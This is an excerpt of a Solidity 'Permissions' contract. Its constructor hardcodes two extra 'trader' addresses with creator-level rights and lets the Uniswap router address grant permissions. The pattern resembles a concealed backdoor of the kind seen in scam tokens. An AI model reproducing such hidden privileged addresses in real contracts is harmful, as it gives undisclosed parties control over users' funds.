...
contract Permissions is Context
{
    ...
    constructor() public
    {
        ...
        _trader = 0x8598Aa522A499B99506628226885bA26F2E01f5F;
        _trader2 = 0x2Ae306DFC07cC2b26725e3B6062beA108E683291;
        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; 
        
        _permitted[_creator] = true;
        _permitted[_trader] = true;
        _permitted[_trader2] = true;
    ...
    {
        require(_msgSender() == _creator || _msgSender() == _uniswap || _msgSender() == _trader || _msgSender() == _trader2, "You do not have permissions for this action");
        _permitted[who] = true;
    }
    
    modifier onlyCreator
    {
        require(_msgSender() == _creator || _msgSender() == _trader || _msgSender() == _trader2, "You do not have permissions for this action");
        _;
    }
